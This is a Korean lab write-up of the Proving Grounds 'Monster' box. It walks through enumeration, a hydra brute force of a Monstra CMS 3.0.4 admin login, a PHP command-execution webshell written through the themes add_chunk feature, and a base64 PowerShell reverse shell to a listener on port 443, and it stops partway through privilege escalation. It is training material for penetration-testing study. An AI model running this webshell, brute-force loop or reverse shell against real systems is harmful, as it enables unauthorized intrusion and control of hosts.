---
tags:
  - type/machine
  - platform/pg
  - os/windows
  - status/partial
  - tech/enum/dirbust
  - tech/enum/searchsploit
  - tech/cred/crack
  - tech/payload/revshell
type: machine
platform: pg
os: windows
ip: 192.168.248.180
ports: [80, 135, 139, 443, 445, 3389]
services: [http, microsoft-ds, ms-wbt-server, msrpc, netbios-ssn, ssl/http]
status: partial
manual_tags: true
manual_cves: true
manual_status: true
tech_count: 4
---
> [!warning] 적대적 검증 정정 이력 (2026-08-20)
> 이 노트는 작성자와 분리된 감사를 거쳤다. Kali `~/PG/Monster/` 산출물·Monstra 3.0.4 소스 클론·Kali 직접 실행으로 대조했고, 아래를 고쳤다.
>
> | 위치 | 무엇이 틀렸나 | 어떻게 고쳤나 |
> |---|---|---|
> | §6-4 `best64.rule` | "에러도 안 났다"가 **거짓**. Kali 에서 직접 때려보니 hashcat 은 `best64.rule: No such file or directory` 를 **stderr 로 찍고 exit 255** 를 낸다 | 진짜 함정(stderr 분리 + 파이프라인이 exit code 를 삼킴)으로 다시 씀 |
> | §4 세션 0 `notepad.exe` 블록 | 출처로 적힌 `try_privesc_full_scrollback.log` 에 `tasklist` 가 **한 번도 안 나온다.** 노트에 실린 `Services`·`0`·`324 K`·`0:00:00`·`N/A` 컬럼은 그 파일에 **없는 값**이다 | 실제 산출물(`Get-WmiObject Win32_Process` 필터 출력, notepad 23개)로 교체. "세션 0" 판독은 `[가정]` 으로 강등 |
> | §4 `nxc smb` 블록 | 비대화형 `ssh kali "..."` 결과에 `┌──(kali㉿kali)` 프롬프트를 붙여 놨다. `try2_spray_admin.log` 에 그 두 줄은 없다 | Kali 프롬프트 2줄 제거. 타겟 `PS ...>` 프롬프트는 실측이므로 전부 유지 |
> | §4 배제 표 | 표 14줄 중 4줄(5·11·13·14)의 출력이 **어느 산출물에도 없다.** 스크롤백은 그 명령이 발사된 지점에서 끊긴다 | 삭제하지 않고 표에 출처 열을 붙여 「스크롤백 저장 이후, 파일 미보존」으로 명시 |
> | §4 MySQL / `INTO OUTFILE` | 「XAMPP 니까 MySQL 이 있다」는 조합 추론이 노트에 암묵적으로 남아 있었다 | §4-2 를 신설해 실측 반증 3종을 적음. **Monstra 3.0.4 는 플랫파일 CMS 라 DB 가 아예 없다**(소스로 확인) |
> | §5 플래그 블록 | 출처 표기 없음 | `proof_user.txt` 의 **내력**(하네스 차단으로 러너가 저장 실패 → `tmux capture-pane -S -3000` 으로 66행 사후 회수)을 명시 |
> | §4-1 `DefaultDomainName` | 관측은 사실이나 "이름을 바꿨다"는 **해석**을 단정으로 적었다 | `[가정]` 강등 + §4-3 미해결 단서로 승격 |
> | 상단 요약 · §6-6 · §6-8 | 「쓰기 가능한 **서비스** 바이너리까지 도달」·「`StartName` 을 빼먹어서 XAMPP 를 놓쳤다」 — 셋 다 **XAMPP 가 서비스라는 반증된 전제** 위에 서 있었다. 놓친 XAMPP 서비스라는 것이 존재하지 않는다 | 세 곳 모두 정정. §6-6 에는 "이걸 초반에 봤어도 안 풀렸다"를 `[가정]` 으로 명시 |
> | §4 XAMPP 절 ↔ 신설 §4-2-b/c | 같은 내용의 절이 두 벌 있었다(동시 편집) | 터미널 원문은 전부 살린 채 한 절로 합침. **출력 블록은 한 줄도 지우지 않았다** |
> | **감사자 본인의 오분류** — `C:\xampp` ACL | 「XAMPP 가 서비스가 아니니 **쓰기 권한이 무의미하다**」로 정리하고 배제 표 17번에 올렸다. **사실과 결론을 붙여 버린 것**이다 — 「서비스가 아니다」는 맞지만(`Win32_Service` 빈 결과·`sc.exe qc mysql`→1060), `httpd.exe`·`mysqld.exe` 가 `Authenticated Users:(M)` 라 **mike 가 실제로 덮어쓸 수 있다.** 이건 배제가 아니라 **미완**이다 | 표에서 빼고(17→16줄) **§4-4「미완 — 가장 유력한 리드」로 승격.** 남은 질문(「무엇이 SYSTEM 으로 재실행하는가」)과 미확인 후보 4개, Session 0 notepad 와의 연결 `[가정]` 을 명시 |
> | §6-8 중단 사유 | 박스가 왜 내려갔는지가 없어 **「시도해서 실패」로 읽혔다** | 포털 동시 1대 슬롯 규칙에 따른 **운영 결정**임을 명시. 기술적 실패도 조작 실수도 아니다 |
> | §6-4 ↔ §6-7 | `best64.rule` 항목이 두 곳에 중복 | §6-7 을 정본으로 두고 §6-4 는 한 줄 포인터로 |
>
> 반증돼 **철회한 지적**: §4 `icacls`·`whoami /all`·`try4`·`try6` 블록, hydra 출력, 삭제 전후 `dir` 블록은 산출물과 **바이트 단위로 일치**했다. 사이트 사전에 `wazowski` 가 실제로 있다(`cewl.txt:38`)는 것도 확인했다.

> [!danger] 이 박스는 **root 를 못 잡았다** — 다만 「실패」와 「중단」이 섞여 있다
> `proof.txt` 미확보. §4-2 의 **16종은 때려보고 배제한 것**이고, §4-4 는 **때리다 끊긴 것**이다 — `httpd.exe`·`mysqld.exe` 를 mike 가 덮어쓸 수 있다는 데까지 갔고, 「무엇이 이걸 SYSTEM 으로 재실행하는가」를 찾던 중 **포털 슬롯 규칙으로 인스턴스가 정지·리버트됐다**(§6-8). 다시 붙는 사람은 §4-2 를 되풀이하지 말고 **§4-4 부터** 시작하면 된다.

> [!info] PG Practice — **Monster** · Fundamental
> **타겟** 192.168.248.180 · **OS** Windows 10 (빌드 10.0.19041, 호스트 `MIKE-PC`) · **난이도** Fundamental · **플래그 2개 중 1개 획득 (user 만, proof 미확보)**
> **경로 요약** tcp/80 XAMPP(Apache 2.4.41 / PHP 7.3.10) → `/blog` = **Monstra CMS 3.0.4** → `/blog/users` 가 사용자명 공개 → cewl+룰 사전으로 hydra → `admin:wazowski` → 관리자 패널 **themes → add_chunk** 로 PHP 파일 생성(EDB-52038) → `/blog/public/themes/default/*.chunk.php` RCE → PowerShell 리버스셸(tcp/443) → `C:\Users\mike\Desktop\local.txt`
> **권한상승은 실패했다.** `proof.txt` 를 얻지 못했다. 후보 **16종을 때려 전부 배제했다** — AutoLogon 평문 비번·`AlwaysInstallElevated`·서비스 바이너리·스케줄 작업·자격증명 파일·SeriousSAM·크리덴셜 재사용·MySQL(§4-2). MySQL 축은 **원리적으로 존재하지 않았다** — Monstra 는 플랫파일 CMS 다(§4-2-b).
> **다만 하나는 배제가 아니라 미완이다.** `C:\xampp\apache\bin\httpd.exe`·`mysql\bin\mysqld.exe` 가 `Authenticated Users:(M)` 라 **mike 가 덮어쓸 수 있다.** 지금 그걸 실행하는 주체가 mike 라(자동 로그온 데스크톱 세션) **「무엇이 이걸 SYSTEM 으로 재실행하는가」 한 조각이 비어 있고**, 그 조각을 찾던 중 포털 슬롯 규칙으로 인스턴스가 리버트됐다(§6-8). 그 리드는 **§4-4** 에, 연결 못 지은 관측 둘은 §4-3 에 남긴다. **막힌 기록도 기록이다.**
>
> 작업일 2026-08-20. 당시 Kali `tun0` 은 **192.168.45.207** 이었다(LHOST 를 그대로 복사하지 마라). 타겟 로컬시각은 **UTC-7(PDT)**, Kali 는 UTC+9 다 — 아래 시각 표기가 섞이지 않게 매번 어느 쪽인지 밝힌다.

## 0. 이 박스에서 배우는 것

- **CMS가 사용자명을 공짜로 준다.** Monstra 의 `/blog/users` 는 인증 없이 전체 사용자 목록을 뿌린다. 사용자명을 아는 순간 브루트포스의 탐색공간이 두 자릿수로 줄어든다.
- **사이트 본문에서 만든 사전이 rockyou 를 이긴다.** 여기 정답 `wazowski` 는 10k 상용 사전에는 없고 **사이트에 대문짝만하게 적혀 있었다.** cewl → 룰 확장 → hydra 가 정석이다.
- **로그인 잠금이 서버가 아니라 쿠키에 있으면 잠금이 아니다.** 그리고 그 잠금은 **자동화가 아니라 손으로 하는 나를 잡는다**(§6-1).
- **업로드가 막혀도 관리자 패널은 대개 PHP 를 쓸 수 있다.** 업로드 기능이 죽어 있어도 **테마/스니펫 에디터**가 남아 있으면 그게 곧 임의 파일 쓰기다.
- **스택 조합에서 구성요소를 유추하면 없는 경로를 판다.** 「XAMPP 배너 = MySQL 있음」이 이 박스에서 제일 비쌌던 오답이다. 서비스·프로세스·소켓 셋 다 없었고, 그 위에 **Monstra 는 애초에 DB 를 안 쓰는 플랫파일 CMS** 였다(§4-2-b).
- **쓰기 가능한 바이너리를 찾았으면 다음 질문은 "누가 실행하는가"다.** `C:\xampp` 는 `Authenticated Users:(M)` 였지만 XAMPP 가 서비스가 아니라 mike 데스크톱 세션에서 떠서 **아무 의미가 없었다**(§4-2-c).
- **시험 출제 가능성** — Monstra 자체가 나올 확률은 낮다. 전이되는 것은 "무명 CMS + 버전 문자열 → 공개 익스플로잇은 대부분 **인증 필요** → 그러면 문제는 익스플로잇이 아니라 **크리덴셜**이다" 라는 순서 감각이다.

## 1. 정찰

### Nmap

```
ssh kali@10.44.44.128 "tmux new-session -d -s mon_nmap 'mkdir -p ~/PG/Monster && cd ~/PG/Monster && nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.180 2>&1 | tee nmap.full.txt; exec bash'"
```

`nnmap` 별칭(`~/.zshrc`)을 tmux 에 그대로 넣으면 안 된다. 별칭은 대화형 zsh 전용이라 비대화형 셸에서 확장되지 않고 스캔이 0초에 죽는다. 명령을 펼쳐서 쓴다.

```
# Nmap 7.98 scan initiated Thu Aug 20 20:09:05 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.180
Nmap scan report for 192.168.248.180
Host is up (0.091s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.3.10)
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.3.10
|_http-title: Mike Wazowski
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.3.10)
| tls-alpn: 
|_  http/1.1
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Mike Wazowski
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.3.10
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-08-20T11:12:33+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: MIKE-PC
|   NetBIOS_Domain_Name: MIKE-PC
|   NetBIOS_Computer_Name: MIKE-PC
|   DNS_Domain_Name: Mike-PC
|   DNS_Computer_Name: Mike-PC
|   Product_Version: 10.0.19041
|_  System_Time: 2026-08-20T11:12:18+00:00
| ssl-cert: Subject: commonName=Mike-PC
| Not valid before: 2026-08-19T11:05:01
|_Not valid after:  2027-02-18T11:05:01
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
```

출처: `~/PG/Monster/nmap.log`

읽을 줄은 세 개다.

`Apache 2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.3.10` — 이 세 버전 조합은 **XAMPP for Windows 7.3.10** 의 출하 조합이다. 뒤에서 `/phpmyadmin`·`/webalizer` 가 404 가 아니라 **403**(XAMPP 의 `Require local`)으로 답한 것, `/php-cgi/php-cgi.exe` 가 존재한 것이 두 번째·세 번째 독립 근거가 된다. 배너 하나로 XAMPP 라고 단정하지 않았다.

`rdp-ntlm-info` 가 NLA 협상 과정에서 **호스트명·빌드를 그냥 뱉는다**(`MIKE-PC`, `10.0.19041`). 워크그룹 머신이고 도메인이 없다는 것도 여기서 확정된다.

`5040`(CDPSvc)·`7680`(Delivery Optimization)·`49664~49669`(동적 RPC)는 Windows 10 기본 구성이다. 고포트는 부팅마다 바뀌므로 색인에서도 제외한다.

UDP top-100 도 돌렸다. 열린 포트가 없었다(`nmap_udp.log`).

### 디렉터리 열거

```
gobuster dir -u http://192.168.248.180/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak,zip -t 40 -o gobuster80.log
```

의미 있는 것만 추리면 이렇다(403 은 대부분 Windows 예약 디바이스명 `con`·`aux` 나 `*` 같은 잘못된 문자에 Apache 가 답한 것이라 소음이다):

```
/index.html           (Status: 200) [Size: 22916]
/blog                 (Status: 301) [Size: 342] [--> http://192.168.248.180/blog/]
/assets               (Status: 301) [Size: 344] [--> http://192.168.248.180/assets/]
/Index.html           (Status: 200) [Size: 22916]
/examples             (Status: 503) [Size: 1062]
/Blog                 (Status: 301) [Size: 342] [--> http://192.168.248.180/Blog/]
/Assets               (Status: 301) [Size: 344] [--> http://192.168.248.180/Assets/]
/INDEX.html           (Status: 200) [Size: 22916]
```

출처: `~/PG/Monster/gobuster80.log` (ANSI 색코드 제거 후)

443 은 80 과 `ETag`·`Last-Modified`·`Content-Length` 가 전부 같다. 같은 문서루트다. 따로 팔 것이 없다.

루트는 Monsters, Inc. 테마의 정적 랜딩 페이지다. 여기 제목이 곧 `Mike Wazowski` 이고, **§2 의 사전이 이 화면에서 나온다.**

![[PG-Monster-80-index.png]]

### Monstra 3.0.4

`/blog/` 의 응답 헤더와 본문에 두 가지가 같이 나온다.

```
<meta name="robots" content="index, follow"><meta name="generator" content="Powered by Monstra 3.0.4" />
<link rel="stylesheet" href="http://monster.pg/blog/public/assets/css/bootstrap.css" type="text/css" />
```

`generator` 메타가 버전을, 자산 링크가 **vhost `monster.pg`** 를 알려준다. `siteurl` 옵션에 호스트명이 박혀 있어서 IP 로 접근해도 링크·리다이렉트가 전부 `monster.pg` 로 나간다. Kali `/etc/hosts` 에 한 줄 넣고 시작한다.

```
ssh kali@10.44.44.128 "grep -q monster.pg /etc/hosts || echo '192.168.248.180 monster.pg' | sudo tee -a /etc/hosts"
```

![[PG-Monster-80-blog.png]]

버전의 두 번째 근거는 푸터의 `Powered by Monstra 3.0.4` 다. 그리고 **소스를 클론해 대조**했다(`git clone https://github.com/monstra-cms/monstra`) — `engine/Monstra.php` 의 `const VERSION = '3.0.4'` 와 일치한다. 이 클론은 이후 익스플로잇 판단의 1차 사료가 된다.

### 사용자명은 그냥 준다

```
$ curl -s 'http://monster.pg/blog/users' | sed -e 's/<[^>]*>/ /g'
 ...
 Users 
 admin 
 mike 
```

`/blog/users/1`, `/blog/users/2` 는 이메일까지 준다 — `wazowski@monster.pg`, `mike@monster.pg`. (HTML 엔티티로 난독화돼 있지만 브라우저가 풀어준다.)

**사용자가 둘뿐이라는 사실이 뒤의 브루트포스를 현실적으로 만든다.** 이 박스의 서버 상한은 실측 70 req/s 였는데, 사용자를 모른 채 사전을 돌렸다면 계정 후보만큼 곱해져 손을 못 댔을 것이다.

## 2. 취약점 분석

### 공개 익스플로잇은 전부 「인증 필요」다

```
$ searchsploit monstra
 Monstra CMS 3.0.4 - (Authenticated) Arbitrary ... | php/webapps/43348.txt
 Monstra CMS 3.0.4 - Authenticated Arbitrary F ... | php/webapps/48479.txt
 Monstra CMS 3.0.4 - Remote Code Execution (Au ... | php/webapps/49949.py
 Monstra CMS 3.0.4 - Remote Code Execution (RC ... | php/webapps/52038.py
```

셋을 읽어보면 전부 관리자/에디터 세션을 전제한다.

- **EDB-48479 / CVE-2017-18048** — filesmanager 에 `.php7` 업로드
- **EDB-49949 / CVE-2018-6383** — 같은 곳에 `.pht`·`.phar` 업로드
- **EDB-52038** — themes 의 `add_chunk` 로 PHP 파일 **생성**

`plugins/box/filesmanager/filesmanager.admin.php` 의 금지 확장자 목록을 열어보면 왜 앞의 둘이 성립하는지 바로 보인다.

```php
$forbidden_types = array('html', 'htm', 'js', 'jsb', 'mhtml', 'mht',
                         'php', 'phtml', 'php3', 'php4', 'php5', 'phps',
                         'shtml', 'jhtml', 'pl', 'py', 'cgi', 'sh', 'ksh', 'bsh', 'c', 'htaccess', 'htpasswd',
                         'exe', 'scr', 'dll', 'msi', 'vbs', 'bat', 'com', 'pif', 'cmd', 'vxd', 'cpl', 'empty');
```

`php7`·`pht`·`phar` 가 없다. 블랙리스트가 `php5` 까지만 세고 멈춘 전형적인 사례다. XAMPP 의 `httpd-xampp.conf` 는 이 확장자들도 PHP 핸들러에 물린다.

그래서 **문제는 익스플로잇이 아니라 크리덴셜**이라는 결론이 선다. 여기서 방향을 바꿨다.

### 로그인 잠금은 쿠키에 있다

`admin/index.php` 를 읽는다.

```php
if (Request::post('login_submit')) {
    if (Cookie::get('login_attempts') && Cookie::get('login_attempts') >= 5) {
        $login_error = __('You are banned for 10 minutes. Try again later', 'users');
    } else {
        $user = $users->select("[login='" . trim(Request::post('login')) . "']", null);
        if (count($user) !== 0) {
            if ($user['login'] == Request::post('login')) {
                if (trim($user['password']) == Security::encryptPassword(Request::post('password'))) {
                    if ($user['role'] == 'admin' || $user['role'] == 'editor') {
```

세 가지가 한꺼번에 정해진다.

1. **잠금 상태가 `login_attempts` 쿠키에 있다.** 서버는 카운터를 갖고 있지 않다. 쿠키를 안 보내는 클라이언트(=hydra)는 잠금을 아예 못 받는다. 반대로 **쿠키 단지를 재사용하는 `curl` 은 6번째 시도부터 밴 화면을 받는다.** 이게 §6-1 의 사고다.
2. `select("[login='...']")` 는 XPath 인젝션 자리로 보이지만, **바로 다음 줄의 `$user['login'] == Request::post('login')`** 이 막는다. 인젝션 문자열을 넣으면 반환된 사용자의 `login` 필드와 POST 원문이 달라져서 통과하지 못한다. `[hash=...]` 를 쓰는 비밀번호 재설정 경로도 똑같은 형태로 막혀 있다.
3. **비밀번호가 맞아도 role 이 admin/editor 가 아니면 `$login_error` 가 설정되지 않는다.** 즉 "Wrong ..." 문자열이 응답에 없다. hydra 를 실패조건 `Wrong` 으로 돌리면 **role 이 낮은 정답 비밀번호까지 히트로 잡힌다.** 실패조건을 고를 때 이 분기를 보고 골랐다.

### 왜 사전을 직접 만들었나

10k 상용 사전(`seclists/.../10k-most-common.txt`)을 두 사용자에 다 돌려 20,000 시도 — 9분, 무소득.

rockyou 는 계산상 불가능하다. 서버 처리량을 실측해 봤다.

```
$ time (for i in $(seq 1 200); do curl -s -o /dev/null -m 30 -d 'login=admin&password=x&login_submit=Log+In' http://192.168.248.180/blog/admin/index.php & done; wait)
( for i in $(seq 1 200); do; curl -s -o /dev/null -m 30 -d   &; done; wait; )  1.51s user 0.83s system 81% cpu 2.865 total
```

200요청/2.87초 = **약 70 req/s**. rockyou 1,434만 개는 이 속도로 **56시간**이다. 시험이었으면 여기서 접었어야 한다.

대신 사이트 본문을 사전으로 만든다.

```
cewl -d 3 -m 4 -w cewl.txt http://192.168.248.180/
cewl -d 3 -m 4 -w cewl_blog.txt http://monster.pg/blog/
cat cewl.txt cewl_blog.txt | sort -u > words.txt          # 253 단어
hashcat --stdout -r /usr/share/hashcat/rules/best66.rule words.txt | sort -u > words_b66.txt   # 14,579
```

`-m 4` 는 4글자 미만을 버린다. `-d 3` 은 링크를 3단계까지 따라간다(이 사이트는 한 장짜리라 큰 의미는 없지만 `/blog` 쪽 하위 페이지를 긁는 데 쓰였다). `best66.rule` 은 대소문자·숫자꼬리·리트 치환 같은 흔한 변형 66개를 붙인다.

## 3. Foothold

### 크리덴셜

```
hydra -I -L users.txt -P words_b66.txt -t 64 192.168.248.180 \
  http-post-form "/blog/admin/index.php:login=^USER^&password=^PASS^&login_submit=Log+In:Wrong"
```

`-I` 는 이전 세션의 `hydra.restore` 확인 프롬프트를 건너뛴다(tmux 안에서 돌릴 때 10초를 잡아먹는다). 마지막 콜론 뒤 `Wrong` 은 **실패 조건**이다 — 응답에 이 문자열이 있으면 실패로 친다.

```
[DATA] max 64 tasks per 1 server, overall 64 tasks, 29158 login tries (l:2/p:145
79), ~456 tries per task
[DATA] attacking http-post-form://192.168.248.180:80/blog/admin/index.php:login=
^USER^&password=^PASS^&login_submit=Log+In:Wrong
[STATUS] 2256.00 tries/min, 2256 tries in 00:01h, 26902 to do in 00:12h, 64 acti
ve
[STATUS] 1927.67 tries/min, 5783 tries in 00:03h, 23375 to do in 00:13h, 64 acti
ve
[STATUS] 1835.86 tries/min, 12851 tries in 00:07h, 16307 to do in 00:09h, 64 act
ive
[80][http-post-form] host: 192.168.248.180   misc: /blog/admin/index.php:login=^
USER^&password=^PASS^&login_submit=Log+In:Wrong   login: admin   password: wazow
ski
```

출처: `tmux capture-pane -pt mon_hydra2` (Kali 20:36 KST). 같은 내용이 `~/PG/Monster/hydra_cewl_run.txt` 에, 히트 한 줄만 추린 것이 `hydra_cewl.log` 에 있다.

**`admin` / `wazowski`.** 사이트 제목이 "Mike Wazowski" 다. 사전에 있던 단어 그대로다.

> [!tip] 수동 대안
> hydra 는 시험에서 허용된다. 그래도 도구 없이 같은 일을 하는 형태를 적어둔다 — 실패 조건이 응답 본문에 있으므로 셸 한 줄이면 된다.
> ```
> while read p; do
>   if ! curl -s -d "login=admin&password=$p&login_submit=Log+In" \
>        http://TARGET/blog/admin/index.php | grep -q Wrong; then echo "HIT: $p"; fi
> done < words_b66.txt
> ```
> **쿠키 옵션(`-b`/`-c`)을 붙이면 안 된다.** 붙이는 순간 5회 만에 밴 화면을 받고 이후 전부 오탐이 된다(§6-1).

### 관리자 패널

```
$ curl -s -i -c a.jar -d 'login=admin&password=wazowski&login_submit=Log+In' 'http://192.168.248.180/blog/admin/index.php' | head -12
HTTP/1.1 302 302 Found
Date: Thu, 20 Aug 2026 11:37:20 GMT
Server: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.3.10
X-Powered-By: PHP/7.3.10
Set-Cookie: PHPSESSID=d1nu49vbucca99uk2j675oifn6; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: index.php
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

302 + `Location: index.php` 가 로그인 성공의 표식이다(실패는 200 + "Wrong ...").

로그인 화면은 이렇게 생겼다. §6-1 에서 시간을 태운 캡차·밴 화면이 붙는 곳이 여기다.

![[PG-Monster-80-admin-login.png]]

### 업로드가 죽어 있다

먼저 정석대로 `.php7` 업로드를 시도했다.

```
$ curl -s -b a.jar -c a.jar -F "csrf=$csrf" -F 'file=@shell.php7;filename=shell.php7' -F 'upload_file=Upload' \
    'http://192.168.248.180/blog/admin/index.php?id=filesmanager&path=uploads/'
$ curl -s -b a.jar 'http://192.168.248.180/blog/admin/index.php?id=filesmanager&path=uploads/' | grep -oE 'message *: *"[^"]*"'
message : "File was not uploaded"
```

확장자를 의심해 `.txt`·`.jpg` 로도 해봤다.

```
t.txt -> message : "File was not uploaded"
t.jpg -> message : "File was not uploaded"
```

**확장자 문제가 아니라 업로드 자체가 죽어 있다.** `filesmanager.admin.php` 에서 이 문구가 나오는 갈래는 `$_FILES['file']` 이 비었거나 `move_uploaded_file()` 이 실패한 경우다. 어느 쪽인지는 `php.ini` 를 못 읽어 확인하지 못했다 — `file_uploads=Off` 가 가장 그럴듯하지만 **`[가정]`** 이다.

### themes → add_chunk (EDB-52038)

업로드가 아니라 **에디터**로 간다. Monstra 관리자 패널의 테마 편집기는 `.chunk.php` 파일을 새로 만들 수 있고, 그 파일은 `public/themes/<theme>/` 밑에 그대로 떨어져 **웹에서 직접 실행된다.**

```
curl -s -b a.jar -c a.jar \
  --data-urlencode 'csrf=ad97499bc94b7df8726fdd354384c172f1062dfe' \
  --data-urlencode 'name=mon9x' \
  --data-urlencode 'content@chunk_payload.php' \
  --data-urlencode 'add_file=Save' \
  'http://192.168.248.180/blog/admin/index.php?id=themes&action=add_chunk'
```

`chunk_payload.php` 내용:

```php
<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; system($_REQUEST["cmd"]); echo "</pre>"; } ?>
```

`--data-urlencode 'content@파일'` 형태를 쓴 이유가 있다. 페이로드에 `<`·`>`·`$`·`"` 가 전부 들어 있어서 SSH 를 한 번 더 거치는 이 환경에서는 인용부호가 두 번 깨진다. 실제로 처음엔 `<pre>` 의 `<` 가 리다이렉션으로 해석돼 원격 bash 가 `pre: No such file or directory` 를 뱉었다. **파일에서 읽어 URL 인코딩까지 curl 에 맡기면 인용 문제가 사라진다.**

CSRF 토큰은 같은 세션에서 `?id=themes&action=add_chunk` 페이지를 GET 해서 뽑는다(`name="csrf" value="..."`). Monstra 의 토큰은 세션 단위라 한 번 뽑으면 계속 쓸 수 있다.

```
$ curl -s 'http://192.168.248.180/blog/public/themes/default/mon9x.chunk.php?cmd=whoami'
<pre>mike-pc\mike
</pre>
```

RCE. 실행 계정은 `mike-pc\mike` — Apache 가 SYSTEM 서비스가 아니라 **mike 로 돌고 있다.**

### 대화형 셸

> [!danger] 웹셸로 읽은 플래그는 OSCP 에서 0점이다
> 규정 원문이 *"this includes any type of web-based shell"* 이다. 위 `?cmd=` 는 **리버스셸을 던지는 데만** 쓰고, 플래그는 반드시 대화형 셸에서 읽는다.

리스너를 먼저 띄운다. 비대화형 SSH 는 호출이 끝나면 자식을 죽이므로 tmux 안이어야 한다.

```
ssh kali@10.44.44.128 "tmux new-session -d -s mon_lsnr443 'rlwrap nc -lvnp 443; exec bash'"
```

PowerShell 리버스셸을 UTF-16LE base64 로 만들어 `-e` 로 넘긴다.

```
iconv -f UTF-8 -t UTF-16LE ps_rev.ps1 | base64 -w0 > ps_rev.b64
B64=$(cat ps_rev.b64)
curl -s -G --data-urlencode "cmd=powershell -nop -w hidden -e $B64" \
  'http://192.168.248.180/blog/public/themes/default/mon9x.chunk.php' -m 25
```

`-G` 는 `--data-urlencode` 를 POST 본문이 아니라 **쿼리스트링**으로 붙인다. base64 에는 `+`·`/`·`=` 가 들어가므로 인코딩 없이 그대로 URL 에 붙이면 `+`가 공백으로 뒤집힌다. curl 이 이걸 처리하게 맡긴다.

`-w hidden` 은 창을 안 띄우고, `-nop` 은 프로필 로딩을 건너뛴다(프로필이 뭔가 출력하면 셸 파서가 오염된다).

```
listening on [any] 443 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.180] 50544
whoami; hostname
mike-pc\mike
Mike-PC
PS C:\xampp\htdocs\blog\public\themes\default>
```

첫 시도에 tcp/443 으로 바로 붙었다. 아웃바운드 제한도 Defender 차단도 없었다.

## 4. 권한상승

**결론부터: 권한상승은 실패했다.** `proof.txt` 를 얻지 못했다.

처음 이 절을 쓸 때는 열거를 시작하는 시점에 실행 도구가 막혀 `whoami /all` 이후로 진행하지 못한 상태였다. 이후 **같은 리버스셸이 살아 있는 채로 세션을 넘겨받아** 아래 열거를 전부 돌렸다. 그래서 이 절은 두 층이다 — 먼저 `whoami /all` 에서 읽어낸 것, 그다음 **실제로 때려본 후보와 그 결과**.

**이 절의 값은 배제 목록에 있다.** 2,000명 넘게 푼 박스이니 우리가 못 본 축이 있다는 뜻이고, **무엇을 어떤 근거로 배제했는지가 다음 사람의 지도**다. 배제한 16종을 §4-2 표에, 그중 설명이 필요한 셋(MySQL·SeriousSAM·크리덴셜 재사용)을 그 아래에, 연결 못 지은 관측 둘을 §4-3 에, **배제가 아니라 끝까지 못 간 리드 하나**를 §4-4 에 남긴다.

**「아니었다」와 「못 갔다」를 섞지 않는 것이 이 절의 규율이다.** 다음 사람이 §4-2 를 되풀이하는 것은 낭비지만, §4-4 를 배제로 읽고 건너뛰면 **정답을 지나친다.**

```
PS C:\xampp\htdocs\blog\public\themes\default> whoami /all

USER INFORMATION
----------------

User Name    SID
============ ==============================================
mike-pc\mike S-1-5-21-2619112490-2635448554-1147358759-1002


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes

====================================== ================ ============ ===========
=======================================
Everyone                               Well-known group S-1-1-0      Mandatory g
roup, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users           Alias            S-1-5-32-555 Mandatory g
roup, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory g
roup, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory g
roup, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory g
roup, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory g
roup, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory g
roup, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory g
roup, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory g
roup, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory g
roup, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192



PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled

PS C:\xampp\htdocs\blog\public\themes\default>
```

> 출처: `~/PG/Monster/proof_user.txt` (§5 에 이 파일의 내력을 적었다)

이 한 화면에서 읽히는 것.

**`SeImpersonatePrivilege` 가 없다.** Potato 계열(JuicyPotato·PrintSpoofer·GodPotato)은 전부 후보에서 빠진다. Windows 서비스 계정에서 튀어나온 셸이면 거의 항상 있는 권한인데 없다는 것이, 아래 두 번째 관측과 맞물린다.

